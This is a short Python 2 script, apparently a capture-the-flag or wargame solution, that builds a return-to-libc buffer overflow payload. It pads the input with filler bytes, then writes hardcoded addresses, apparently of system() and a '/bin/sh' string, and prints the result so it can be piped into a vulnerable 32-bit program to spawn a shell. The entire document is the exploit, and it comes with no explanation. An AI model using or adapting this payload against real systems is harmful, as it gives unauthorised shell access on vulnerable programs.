import struct

sys_addr = struct.pack("I", 0xb7e6b060)
bin_addr = struct.pack("I", 0xb7f8cc58)
padding = "\x42" * 18
padding2 = "\x43" * 4
padding3 = "\x44" * 4
print padding + sys_addr + padding2 + bin_addr + padding3 